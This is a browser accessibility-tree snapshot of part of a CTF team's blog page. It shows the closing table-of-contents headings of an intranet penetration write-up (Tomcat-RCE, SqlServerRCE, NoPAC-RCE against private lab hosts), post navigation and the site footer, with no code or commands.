+                    - listitem [ref=f13e781]:
+                      - link "2、内网区" [ref=f13e782] [cursor=pointer]:
+                        - /url: "#2内网区"
+                      - list [ref=f13e783]:
+                        - listitem [ref=f13e784]:
+                          - link "内网区gitlab:192.168.20.19:8080" [ref=f13e785] [cursor=pointer]:
+                            - /url: "#内网区gitlab19216820198080"
+                        - listitem [ref=f13e786]:
+                          - link "内网区windows:192.168.20.15" [ref=f13e787] [cursor=pointer]:
+                            - /url: "#内网区windows1921682015"
+                    - listitem [ref=f13e788]:
+                      - link "3、核心内网区" [ref=f13e789] [cursor=pointer]:
+                        - /url: "#3核心内网区"
+                      - list [ref=f13e790]:
+                        - listitem [ref=f13e791]:
+                          - link "搭建核心区代理" [ref=f13e792] [cursor=pointer]:
+                            - /url: "#搭建核心区代理"
+                        - listitem [ref=f13e793]:
+                          - 'link "Laravel : 192.168.30.13" [ref=f13e794] [cursor=pointer]':
+                            - /url: "#laravel--1921683013"
+                        - listitem [ref=f13e795]:
+                          - 'link "FTP : 192.168.30.19" [ref=f13e796] [cursor=pointer]':
+                            - /url: "#ftp--1921683019"
+                - listitem [ref=f13e797]:
+                  - link "2023 05 18 day2" [ref=f13e798] [cursor=pointer]:
+                    - /url: "#2023-05-18-day2"
+                  - list [ref=f13e799]:
+                    - listitem [ref=f13e800]:
+                      - link "DMZ区" [ref=f13e801] [cursor=pointer]:
+                        - /url: "#dmz区"
+                      - list [ref=f13e802]:
+                        - listitem [ref=f13e803]:
+                          - link "Tomcat-RCE" [ref=f13e804] [cursor=pointer]:
+                            - /url: "#tomcat-rce"
+                    - listitem [ref=f13e805]:
+                      - link "内网" [ref=f13e806] [cursor=pointer]:
+                        - /url: "#内网"
+                      - list [ref=f13e807]:
+                        - listitem [ref=f13e808]:
+                          - link "docker容器" [ref=f13e809] [cursor=pointer]:
+                            - /url: "#docker容器"
+                        - listitem [ref=f13e810]:
+                          - link "SqlServerRCE" [ref=f13e811] [cursor=pointer]:
+                            - /url: "#sqlserverrce"
+                    - listitem [ref=f13e812]:
+                      - link "核心内网" [ref=f13e813] [cursor=pointer]:
+                        - /url: "#核心内网"
+                      - list [ref=f13e814]:
+                        - listitem [ref=f13e815]:
+                          - link "NoPAC-RCE" [ref=f13e816] [cursor=pointer]:
+                            - /url: "#nopac-rce"
+                        - listitem [ref=f13e817]:
+                          - link "hash" [ref=f13e818] [cursor=pointer]:
+                            - /url: "#hash"
+      - button "Toggle table of contents" [ref=f13e819] [cursor=pointer]
+      - navigation [ref=f13e821]:
+        - link "← Previous 2023 WMCTF SU Write-Up" [ref=f13e822] [cursor=pointer]:
+          - /url: /post/wmctf-2023-su-wu/
+          - generic [ref=f13e823]: ← Previous
+          - generic [ref=f13e824]: 2023 WMCTF SU Write-Up
+        - link "Next → 2023 巅峰极客决赛 SU WriteUp" [ref=f13e825] [cursor=pointer]:
+          - /url: /post/dfjkfinal-2023-su-wu/
+          - generic [ref=f13e826]: Next →
+          - generic [ref=f13e827]: 2023 巅峰极客决赛 SU WriteUp
+  - contentinfo [ref=f13e828]:
+    - generic [ref=f13e829]:
+      - generic [ref=f13e830]:
+        - text: su-team
+        - paragraph [ref=f13e831]: Built for team archives and competition writeups.
+      - generic [ref=f13e832]:
+        - link "GitHub" [ref=f13e833] [cursor=pointer]:
+          - /url: https://github.com/team-su
+        - link "CTFTime" [ref=f13e836] [cursor=pointer]:
+          - /url: https://ctftime.org/team/29641
+        - link "Email" [ref=f13e848] [cursor=pointer]:
+          - /url: mailto:suers_xctf@126.com
+      - paragraph [ref=f13e852]: © 2026 SUer · su-team
